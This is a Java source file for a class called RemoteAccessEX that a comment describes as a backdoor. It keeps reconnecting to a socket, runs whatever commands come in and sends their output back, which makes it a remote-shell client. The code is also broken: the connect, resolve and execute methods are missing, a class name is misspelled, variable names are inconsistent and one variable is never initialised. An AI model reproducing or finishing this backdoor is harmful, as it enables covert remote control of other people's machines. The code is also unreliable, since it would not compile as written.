import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.util.Scanner;
//methods to add, connect, execute, resolve
public class RemoteAccessEX{
  private static Socket s; //socket recieves input
  private static Scanner sc;//takes in input from stream
  private static PrintWriter pr;//write info to the socket
  private static int length;//amount of args passed to backdoor
  private static ProcessBuilder ps;// lets us execute commands
  private static BufferedReader in;//get output
  private static String line;
  private static String stdout;

  public static void main(String args[]){
    String host="localhost";
    int port = 123;
    String ip=resolve(host);
    int stat;
    while(stat!=1){stat=connect(ip,port); //keep trying to connect
    System.out.println("cconnecting");}
    System.out.println("connected");//connected
    pr=new PrintWriter(s.getOutputStream(),true); // look at output stream
    sc = new Scanners(s.getInputStream());// look at output stream
    sc.useDelimiter("\0");//Delimiter is used in order to know the end of the message received.
    String recieved;
    String stdout;
    while(true){
      try{
        recieved = sc.next();
        recieved = recieved.trim();
        recieved = recieved.replace("\0","");
        if(received.contains("quit")){
          pr.println("quit");
          sc.close();
          s.close();
          System.exit(0);
        }
        else{
          stdout = execute(recieved);
          pr.print(stdout+"\0");
          pr.flush();
        }
      }
      catch(Exception e){
        while(stat!=1){stat=connect(ip,port);}
        System.out.println("connected");
        pr=new PrintWriter(s.getOutputStream(),true);
        sc = new Scanners(s.getInputStream());
        sc.useDelimiter("\0");
      }
    }
    }
}
